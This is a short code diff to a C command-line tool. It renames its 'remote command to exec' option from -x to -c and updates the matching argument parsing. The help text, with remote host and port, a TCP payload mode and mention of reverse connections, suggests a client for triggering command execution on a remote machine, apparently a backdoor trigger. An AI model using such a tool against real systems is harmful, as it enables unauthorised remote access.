@@ -51,9 +51,8 @@ void usage() {
   boopprintf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
   boopprintf("-rport             Remote (dst) port      : 22\n");
   boopprintf("-q, quiet          Disable output.\n");
-  boopprintf("-x, execute        Remote command to exec : ls -la\n");
-  boopprintf(
-      "-p, payload        Boop with a TCP payload. No reverse connection.\n");
+  boopprintf("-c, execute        Remote command to exec : ls -la\n");
+  boopprintf("-p, payload        Boop with a TCP payload. No reverse conn.\n");
   boopprintf("-h, help           Print help and usage.\n");
   boopprintf("\n");
   exit(0);
@@ -97,7 +96,7 @@ void clisetup(int argc, char **argv) {
         case 'h':
           usage();
           break;
-        case 'x':
+        case 'c':
           strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
           break;
         case 'q':
